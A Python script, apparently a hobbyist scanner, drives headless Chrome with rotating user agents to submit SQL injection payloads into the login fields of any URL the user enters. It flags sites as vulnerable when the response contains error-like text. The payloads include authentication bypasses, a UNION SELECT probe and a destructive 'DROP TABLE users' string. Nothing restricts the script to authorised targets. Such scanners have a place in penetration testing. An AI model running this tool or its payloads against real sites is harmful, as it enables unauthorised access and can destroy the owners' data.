import re
import random
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from colorama import Fore, Style

# List of user agents for rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
]

def get_random_user_agent():
    return random.choice(user_agents)

def scan_sql_injection(url):
    payloads = ["'", '"', '1', '1', '1"', "' OR 1=1 --", "' OR '1'='1' --", "admin' --", "' OR 1=1 LIMIT 1 --", "1'; DROP TABLE users --", "' AND 1=0 UNION SELECT NULL, NULL, NULL, NULL --"]

    print(f"Testing SQL Injection vulnerabilities for URL: {url}\n")

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument(f"user-agent={get_random_user_agent()}")

    for payload in payloads:
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)

        try:
            username_field = driver.find_element(By.XPATH, "//input[contains(@name, 'username') or contains(@name, 'email')]")
            password_field = driver.find_element(By.XPATH, "//input[contains(@name, 'password')]")

            if username_field and password_field:
                username_field.send_keys("admin")
                password_field.send_keys("password")

                # Test payload in username field
                try:
                    username_field.clear()
                    password_field.clear()
                    username_field = driver.find_element(By.XPATH, "//input[contains(@name, 'username') or contains(@name, 'email')]")
                    password_field = driver.find_element(By.XPATH, "//input[contains(@name, 'password')]")
                    username_field.send_keys(payload)
                    password_field.send_keys("password")  # Static password for now
                    driver.find_element(By.XPATH, "//button | //input[@type='submit']").click()

                    time.sleep(1)  # Add a 1-second delay

                    response = driver.page_source

                    if re.search(r".*error.*|.*mysql.*|.*sql.*|.*syntax.*|.*exception.*|.*warning.*", response, re.IGNORECASE):
                        print(f"{Fore.GREEN}[!] Potential SQL Injection Vulnerability detected in Username field with payload: {payload}{Style.RESET_ALL}")
                        print(f"[-] Payload: {payload}")

                except Exception as e:
                    print(f"Error in testing Username field: {e}")

                # Test payload in password field
                try:
                    username_field.clear()
                    password_field.clear()
                    username_field = driver.find_element(By.XPATH, "//input[contains(@name, 'username') or contains(@name, 'email')]")
                    password_field = driver.find_element(By.XPATH, "//input[contains(@name, 'password')]")
                    username_field.send_keys("admin")
                    password_field.send_keys(payload)
                    driver.find_element(By.XPATH, "//button | //input[@type='submit']").click()

                    time.sleep(1)  # Add a 1-second delay

                    response = driver.page_source

                    if re.search(r".*error.*|.*mysql.*|.*sql.*|.*syntax.*|.*exception.*|.*warning.*", response, re.IGNORECASE):
                        print(f"{Fore.GREEN}[!] Potential SQL Injection Vulnerability detected in Password field with payload: {payload}{Style.RESET_ALL}")
                        print(f"[-] Payload: {payload}")

                except Exception as e:
                    print(f"Error in testing Password field: {e}")

            else:
                print("Login form fields not found.")
        except Exception as e:
            print(f"Error: {e}")

        driver.quit()

if __name__ == "__main__":
    url = input("Enter the URL to test for SQL Injection vulnerabilities: ")
    if not url.startswith("http"):
        url = "https://" + url  # Add http:// or https:// if missing
    scan_sql_injection(url)
